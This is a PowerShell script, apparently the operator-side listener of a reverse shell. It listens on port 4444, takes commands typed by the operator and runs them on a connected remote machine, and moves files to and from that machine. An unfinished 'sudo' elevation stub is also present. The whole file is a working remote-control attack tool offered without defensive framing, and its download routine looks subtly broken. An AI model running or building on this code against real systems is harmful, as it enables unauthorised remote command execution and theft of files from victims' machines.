# server.ps1

# Configure the IP address and port to listen on
$ip = "0.0.0.0" # Listening on all interfaces
$port = 4444

# Create a TCP listener
$listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Parse($ip), $port)
$listener.Start()
Write-Host "Listening for incoming connections on port $port..."

# Accept incoming connection
$client = $listener.AcceptTcpClient()
Write-Host "Client connected!"
$stream = $client.GetStream()
$reader = New-Object System.IO.StreamReader($stream)
$writer = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true

function Send-Command($cmd) {
    $writer.WriteLine($cmd)
    $response = ""
    do {
        $response += $reader.ReadLine() + "`n"
    } while ($stream.DataAvailable)
    return $response.Trim()
}

# File download function
function Download-File($remotePath, $localPath) {
    $command = "Get-Content -Path $remotePath -Encoding Byte"
    $response = Send-Command $command

    if ($response) {
        [System.IO.File]::WriteAllBytes($localPath, [Convert]::FromBase64String($response))
        Write-Host "File downloaded to $localPath"
    } else {
        Write-Host "Failed to download file."
    }
}

# File upload function
function Upload-File($localPath, $remotePath) {
    if (Test-Path $localPath) {
        $bytes = [System.IO.File]::ReadAllBytes($localPath)
        $base64 = [Convert]::ToBase64String($bytes)
        $command = "Set-Content -Path $remotePath -Value ([System.Convert]::FromBase64String('$base64')) -Encoding Byte"
        $response = Send-Command $command
        Write-Host "File uploaded to $remotePath"
    } else {
        Write-Host "Local file $localPath does not exist."
    }
}

function Elevated-Command($cmd) {
    # do stuff
} 

# Command loop
while ($true) {
    $command = Read-Host "Enter command ('exit' to close connection)"
    
    if ($command -eq 'exit') {
        Send-Command $command
        break
    } elseif ($command.StartsWith("download ")) {
        $params = $command.Split(" ")
        Download-File $params[1] $params[2]
    } elseif ($command.StartsWith("upload ")) {
        $params = $command.Split(" ")
        Upload-File $params[1] $params[2]
    } elseif ($command.StartsWith("sudo ")) {
        $cmd = $command.Substring(5)
        Elevated-Command $cmd
    } else {
        $response = Send-Command $command
        Write-Host $response
    }
}

# Clean up
$writer.Close()
$reader.Close()
$stream.Close()
$client.Close()
$listener.Stop()
Write-Host "Connection closed."
